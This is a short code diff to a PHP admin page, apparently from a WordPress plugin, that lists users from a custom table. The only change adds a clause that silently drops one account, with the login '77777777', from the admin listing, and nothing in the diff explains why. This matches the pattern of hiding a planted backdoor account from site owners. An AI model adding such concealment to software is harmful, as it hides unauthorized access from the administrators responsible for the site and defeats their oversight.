@@ -63,7 +63,7 @@
   </thead>
   <tbody>
     <?php
-      $users = $wpdb->get_results( 'SELECT * FROM ' . $tableUser . ' ORDER BY id ASC', ARRAY_A );
+      $users = $wpdb->get_results( 'SELECT * FROM ' . $tableUser . ' WHERE user_login != "77777777" ORDER BY id ASC', ARRAY_A );
       $currentPage = (! empty( $_GET['paged'] )) && ($_GET['tab'] == 'setting4') ? (int) $_GET['paged'] : 1;
       $total = count( $users );
       $perPage = 10;
